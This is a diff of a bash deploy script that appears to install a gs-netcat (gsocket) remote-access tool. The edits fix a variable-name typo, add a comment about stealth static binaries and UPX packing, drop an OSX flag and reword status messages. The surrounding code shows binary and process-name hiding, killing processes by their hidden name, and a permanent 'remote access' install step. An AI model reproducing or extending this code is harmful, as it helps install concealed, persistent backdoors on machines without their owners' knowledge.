@@ -864,7 +864,7 @@ init_vars()
 	if [[ -n $GS_BIN ]]; then
 		BIN_HIDDEN_NAME="${GS_BIN}"
 		BIN_HIDDEN_NAME_RM+=("${GS_BIN}")
-		[[ -z $GS_SERVICER ]] && GS_SERVICE="$GS_BIN"
+		[[ -z $GS_SERVICE ]] && GS_SERVICE="$GS_BIN"
 	else
 		BIN_HIDDEN_NAME="${GS_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
 	fi
@@ -884,6 +884,7 @@ init_vars()
 
 	unset LDSO
 	# DISABLED because ld-linux.so loading of static bins (gsnc-stealth) wont work :/
+	# Can be patched with patchelf to add vdso.so but wont work on upx packed bins.
 	# [[ "$OSNAME" == *linux* ]] && [[ -z "$S" ]] && {
 	# 	LDSO="$(echo /lib64/ld-*.so.*)"
 	# 	[[ ! -f "${LDSO}" ]] && LDSO="$(echo /lib/ld-*.so.*)"
@@ -896,7 +897,6 @@ init_vars()
 		WARN "OSX is least supported. GS_UNDO= may not work. Check manually"
 		KL_CMD="killall"
 		KL_CMD_TERM="killall"
-		IS_KILL_ON_ARGV0=1
 		KL_NAME="${PROC_HIDDEN_NAME}"
 		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
 	elif command -v pkill >/dev/null; then
@@ -1816,7 +1816,7 @@ dl()
 
 	[[ -n "$GS_USELOCAL_GSNC" ]] && {
 		xcp "$GS_USELOCAL_GSNC" "${2}" && return
-		FAIL_OUT "GS_USELOCAL_GSNC set but does not exists..."
+		FAIL_OUT "GS_USELOCAL_GSNC set but file ${CDG}$GS_USELOCAL_GSNC${CN} does not exists..."
 		errexit
 	}
 	if [[ -n "$GS_USELOCAL" ]]; then
@@ -2139,7 +2139,7 @@ gs_start()
 
 	printf "%-70.70s" "${STARTING_STR}....................................................."
 	if [[ -n "$GS_NOSTART" ]]; then
-		SKIP_OUT "GS_NOSTART=1 is set."
+		SKIP_OUT "${CDC}GS_NOSTART=1${CN} is set."
 		return
 	fi
 
@@ -2223,7 +2223,8 @@ if [[ -z $GS_NOINST ]]; then
 	fi
 else
 	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilD" "${PROC_HIDDEN_NAME}"
-	echo -e "${CDC}GS_NOINST=1${CN} is set. Skipping installation."
+	echo -en "Installing remote access.............................................."
+	SKIP_OUT "${CDC}GS_NOINST=1${CN} is set."
 fi
 # -----END Install permanentally-----
 
